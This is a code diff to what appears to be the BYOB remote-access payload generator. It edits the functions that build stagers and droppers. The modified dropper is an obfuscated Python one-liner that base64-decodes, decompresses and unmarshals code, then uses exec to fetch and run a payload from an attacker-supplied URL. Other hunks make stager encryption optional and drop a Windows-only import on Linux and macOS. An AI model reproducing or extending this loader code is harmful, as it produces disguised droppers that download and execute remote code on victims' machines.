@@ -239,6 +239,9 @@ def _imports(options, **kwargs):
                         else:
                             imports.add(line.strip())
     imports = list(imports)
+    if "import _winreg" in imports and (sys.platform == "linux2" or sys.platform == "darwin"):
+        util.display('- removing _winreg import', color = 'red', style = 'dim', end=',')
+        imports.remove("import _winreg")
     return imports
                  
 def _hidden(options, **kwargs):
@@ -330,7 +333,10 @@ def _stager(options, **kwargs):
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
-    stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
+    if options.encrypt: 
+        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
+    else:
+        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])
     if not os.path.isdir('modules/stagers'):
         try:
             os.mkdir('modules/stagers')
@@ -386,7 +392,7 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
     with file(name, 'w') as fp:
         fp.write(dropper)
 
